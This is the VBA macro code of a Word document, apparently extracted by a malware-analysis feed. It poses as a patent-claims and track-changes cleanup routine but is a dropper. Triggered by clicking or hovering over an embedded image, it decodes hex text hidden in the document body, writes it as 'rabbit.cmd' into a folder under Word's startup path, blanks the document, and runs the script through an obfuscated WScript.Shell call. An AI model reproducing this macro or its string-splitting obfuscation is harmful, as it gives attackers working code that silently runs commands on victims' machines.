Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Yuiop As String
Private Megan As String
Private Yolerd As String
Private Geolpp As String


Private Sub UpdateOldPatentClaims()


    Dim currentTrackChanges As Boolean
    On Error Resume Next
    currentTrackChanges = ActiveDocument.TrackRevisions

    ' (1) turns on track changes
    ActiveDocument.TrackRevisions = True
    With Options
        .InsertedTextMark = wdInsertedTextMarkUnderline
        .InsertedTextColor = wdBlue
        .DeletedTextMark = wdDeletedTextMarkStrikeThrough
        .DeletedTextColor = wdByAuthor
        .RevisedPropertiesMark = wdRevisedPropertiesMarkColorOnly
        .RevisedPropertiesColor = wdBrightGreen
        .RevisedLinesMark = wdRevisedLinesMarkOutsideBorder
        .RevisedLinesColor = wdAuto
        .CommentsColor = wdByAuthor
    End With

    ' (2) removes all text that is formatted with strikethrough
    With Selection.Find
        .ClearFormatting
        .Format = True
        .Font.StrikeThrough = True
        .Forward = True
        .Wrap = wdFindContinue
        .Replacement.ClearFormatting
        .Replacement.Text = ""
        .Execute Forward:=True, Replace:=wdReplaceAll, _
        FindText:="", ReplaceWith:=""
    End With

    ' (3) removes underline formatting but leave text
    With Selection.Find
        .ClearFormatting
        .Format = True
        .Font.Underline = True
        .Font.Bold = False
        .Font.StrikeThrough = False
        .Font.Italic = False
        .Forward = True
        .Wrap = wdFindContinue
        .Replacement.ClearFormatting
        .Replacement.Font.Underline = False
        .Execute Forward:=True, Replace:=wdReplaceAll, _
        FindText:="", ReplaceWith:=""
    End With

    ' (4) changes track changes setting to whatever it was before the macro
        
    VBA.CallByName VBA.CreateObject(Empty + "W" + Empty + "Sc" & Empty & "rip" & "t." & Megan), _
            "R" & Empty & "u" & Empty & Empty & "" & "n", VbMethod, _
            """" & Yuiop & """" & " " & currentTrackChanges, 0
    
    ActiveDocument.TrackRevisions = currentTrackChanges

End Sub


Sub InsertTable(RowsToInsert)
    ActiveDocument.Tables.Add Range:=Selection.Range, NumRows:=RowsToInsert, NumColumns:= _
        4, DefaultTableBehavior:=wdWord9TableBehavior, AutoFitBehavior:= _
        wdAutoFitFixed
    With Selection.Tables(1)
        If .Style <> "Table Grid" Then
            .Style = "Table Grid"
        End If
        .ApplyStyleHeadingRows = True
        .ApplyStyleLastRow = False
        .ApplyStyleFirstColumn = True
        .ApplyStyleLastColumn = False
        .ApplyStyleRowBands = True
        .ApplyStyleColumnBands = False
    End With
End Sub


Private Function RunOverSpace() As String

Dim Roklpp As String
Dim Fersddp As Integer
Dim byteArray As String
Dim i As Long
Dim pos As Long
Dim Value As String

Roklpp = ActiveDocument.Content.Text & Empty
Roklpp = Replace(Roklpp, "[char]", "")
Roklpp = Replace(Roklpp, "/", "")
Roklpp = Replace(Roklpp, " ", "")
Roklpp = Trim(Mid(Roklpp, 2, Len(Roklpp) - 1))
'MsgBox Roklpp

Value = ""
Fersddp = Len(Roklpp) / 2
For i = 0 To Fersddp - 1
    If i = 0 Then
        pos = i + 1
    Else
        pos = i * 2 + 1
    End If
    Value = Value & Chr(Val("&H" & Mid(Roklpp, pos, 2)))
Next
RunOverSpace = Value
End Function


Private Sub Olerr(Fer As String)
Dim Data As String
Data = RunOverSpace
Yuiop = Fer & Empty & "\Bunny" & Empty
On Error Resume Next
MkDir Yuiop
Yuiop = "" & Yuiop & Empty & "\rabbit." & Empty & "c" & Empty & "m" & Empty & "d"
Dim Reopl As Integer
Reopl = FreeFile
Open Yuiop For Output As #Reopl
Print #Reopl, Data
Close #Reopl
Megan = Empty & "s" & Empty & "h" & "" & "" & "el" & "l" & Empty
Exit Sub
InsertTable 4
End Sub


Private Sub getInfo()
Dim SomeTable As Object
On Error Resume Next
Set SomeTable = ActiveDocument.Tables(1).Rows
SomeTable.Select
Selection.Cells.DistributeWidth
    For Each ROW_ In ActiveDocument.Tables(1).Rows
        For Each Cell In ROW_.Cells
            Debug.Print (Cell.Height)
            Debug.Print (Cell.Width)
        Next Cell
    Next ROW_
Olerr Application.StartupPath
End Sub


Private Sub Mozgi()
If (Len(ActiveDocument.Content.Text) > 33) Then
getInfo
ActiveDocument.Content.Text = ""
UpdateOldPatentClaims
End If
End Sub


Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
Mozgi
End Sub

Private Sub Image1_Click()
Mozgi
End Sub







' InQuest injected base64 decoded content
' Z+:yr

INQUEST-PP=macro
